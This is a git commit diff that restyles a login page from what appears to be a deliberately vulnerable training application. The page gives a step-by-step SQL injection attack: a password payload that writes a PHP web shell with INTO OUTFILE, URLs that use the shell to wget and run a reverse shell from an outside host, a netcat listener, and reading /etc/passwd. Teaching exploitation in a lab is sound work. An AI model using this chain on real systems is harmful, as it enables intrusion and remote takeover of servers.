f93dcfab613370923a90c8d56b393ef47185e472
Damien Buttler <damien@doublehops.com>
2019-05-10 15:01:15 +1000

    Better styling of instructions.

--- web/login.php
+++ web/login.php
@@ -64,6 +64,8 @@
             </p>
         </div>
 			
+        <div class="steps">
+            <h2>Step 1</h2>
             <h4>Create malicious file on the host</h4>
             <p>Use the <em>into outfile</em> MySQL command to create a PHP script on the server that will run our commands.</p>
             <p>Password: <em class="input">mypass');SELECT "&lt;?php system($_GET['cmd']);" INTO OUTFILE "/var/www/web/images/system.php";'</em></p>
@@ -75,21 +77,25 @@
                 SELECT * FROM user WHERE username='damien' AND password=MD5('mypass');select "&lt;?php system(['cmd'])" INTO OUTFILE "/var/www/web/images/system.php";'')
                 </p>
             </div>
-            <br />
-			
-			<h4> Use the newly created script to download a reverse shell</h4>
-			<p><a href="http://<?= HOST ?>/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py" target="_blank">http://<?= HOST ?>/images/system.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
-			</p>
+		</div>	
 
-			<br />
+        <div class="steps">
+            <h2>Step 2</h2>
+		    <h4> Use the newly created script to download a reverse shell</h4>
+		    <p><a href="http://<?= HOST ?>/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py" target="_blank">http://<?= HOST ?>/images/system.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
+            </p>
+        </div>
 			
+        <div class="steps">
+            <h2>Step 3</h2>
 			<h4>Change the permissions on the reverse shell to make it executable</h4>
 			<p>
 			    <a href="http://<?= HOST ?>/images/system.php?cmd=chmod%20777%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=chmod 777  /tmp/reverse-shell.py</a>
 			</p>
+        </div>
 
-			<br />
-			
+        <div class="steps">
+            <h2>Step 4</h2>
 			<h4>Open a waiting network service on your host machine</h4>
             <p>Open the network service on port 4444 using <a href="http://netcat.sourceforge.net/" target="_blank">netcat</a>.</p>
             <div class="code-block">
@@ -98,19 +104,24 @@
                     nc -nlvp 4444
                 </p>
             </div>
-			<br />
+        </div>
 			
+        <div class="steps">
+            <h2>Step 5</h2>
 			<h4>Run the downloaded reverse shell</h4>
 			<p>
 			    <a href="http://<?= HOST ?>/images/system.php?cmd=python%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/system.php?cmd=python /tmp/reverse-shell.py</a>
 			</p>
-            <br />
+        </div>
 
+        <div class="steps">
+            <h2>Completed</h2>
             <h4>You should now be connected</h4>
             <p>
                 The netcat command ran from the host machine should now be connected to the reverse shell. Try running commands such as `whoami` and `cat /etc/passwd`.
             </p>
-		</div>
+        </div>
+    </div>
 
     <script>
         window.onload = function() {
